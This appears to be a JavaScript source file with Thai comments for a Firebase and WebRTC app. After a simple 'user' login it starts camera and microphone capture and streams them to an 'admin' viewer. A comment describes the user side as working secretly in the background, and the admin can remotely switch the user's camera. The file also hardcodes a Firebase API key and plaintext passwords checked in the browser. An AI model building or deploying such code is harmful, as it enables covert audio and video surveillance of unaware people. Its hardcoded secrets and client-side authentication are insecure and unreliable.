// --- ส่วนการตั้งค่า Firebase คงเดิมตามไฟล์ของคุณ ---
const firebaseConfig = {
    apiKey: "AIzaSyAnPDK7to2DWFnti490ri8YRCBkpTajOHY",
    authDomain: "pokdeng-61c5e.firebaseapp.com",
    databaseURL: "https://pokdeng-61c5e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pokdeng-61c5e",
    storageBucket: "pokdeng-61c5e.firebasestorage.app",
    messagingSenderId: "518814980796",
    appId: "1:518814980796:web:32b310d1a0b2bc7d058eb9"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const pcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

let isAdmin = false;
let currentFacingMode = "user"; 
let localStream = null;
let peerConnection = null;

function checkLogin() {
    const pass = document.getElementById('pass-input').value;
    if (pass === "admin1234") { 
        isAdmin = true;
        document.getElementById('admin-panel').style.display = "block";
        document.getElementById('login-overlay').style.display = "none";
        // ในฝั่ง Admin เราจะยังไม่รัน WebRTC จนกว่าจะกดปุ่ม connect
    } else if (pass === "user") { 
        isAdmin = false;
        document.getElementById('login-overlay').style.display = "none";
        initUserLogic(); // ฝั่ง User เริ่มทำงานทันที
    } else {
        alert("รหัสผ่านไม่ถูกต้อง!");
    }
}

// --- ฝั่ง ADMIN: กดปุ่มเพื่อเริ่มดู ---
async function startListening() {
    document.getElementById('conn-text').innerText = "กำลังเชื่อมต่อ...";
    document.getElementById('connectBtn').disabled = true;

    peerConnection = new RTCPeerConnection(pcConfig);

    peerConnection.ontrack = (event) => {
        document.getElementById('remoteVideo').srcObject = event.streams[0];
        document.getElementById('conn-text').innerText = "เชื่อมต่อสำเร็จ";
    };

    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/admin').push(event.candidate.toJSON());
        }
    };

    // รอรับสัญญาณจาก User (Offer)
    database.ref('stream_signal/offer').on('value', async (snap) => {
        if (snap.exists()) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            database.ref('stream_signal/answer').set({ type: answer.type, sdp: answer.sdp });
        }
    });

    database.ref('ice_candidates/user').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });
}

// --- ฝั่ง USER: แอบทำงานเบื้องหลัง ---
async function initUserLogic() {
    peerConnection = new RTCPeerConnection(pcConfig);
    
    localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: currentFacingMode },
        audio: true
    });
    document.getElementById('localVideo').srcObject = localStream;
    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));

    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/user').push(event.candidate.toJSON());
        }
    };

    // สร้าง Offer ทิ้งไว้ใน Firebase
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    await database.ref('stream_signal/offer').set({ type: offer.type, sdp: offer.sdp });

    database.ref('stream_signal/answer').on('value', async (snap) => {
        if (snap.exists() && !peerConnection.currentRemoteDescription) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
        }
    });

    database.ref('ice_candidates/admin').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });

    database.ref('camera_control').on('value', async (snap) => {
        const mode = snap.val()?.facingMode;
        if (mode && mode !== currentFacingMode) {
            currentFacingMode = mode;
            location.reload(); 
        }
    });
}

function switchCamera() {
    const newMode = currentFacingMode === "user" ? "environment" : "user";
    database.ref('camera_control').set({ facingMode: newMode });
}
